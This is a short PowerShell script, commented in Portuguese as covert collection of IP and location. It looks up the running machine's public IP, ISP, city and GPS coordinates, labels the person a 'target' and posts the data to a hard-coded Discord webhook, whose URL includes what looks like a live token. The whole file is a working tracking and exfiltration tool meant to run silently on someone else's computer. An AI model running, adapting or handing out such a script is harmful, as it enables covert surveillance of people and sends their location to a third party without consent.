# Coleta de IP e Localização Furtiva
$webhook = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"
$info = Invoke-RestMethod -Uri "http://ip-api.com"

$msg = @{
    content = "📍 **Localização do Alvo Detectada:**`n" +
              "🌐 **IP:** $($info.query)`n" +
              "🏢 **Provedor:** $($info.isp)`n" +
              "📍 **Cidade:** $($info.city) / $($info.regionName)`n" +
              "🌎 **Coordenadas:** $($info.lat), $($info.lon)"
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType "application/json"
Write-Host "Localização enviada ao Discord!" -ForegroundColor Green
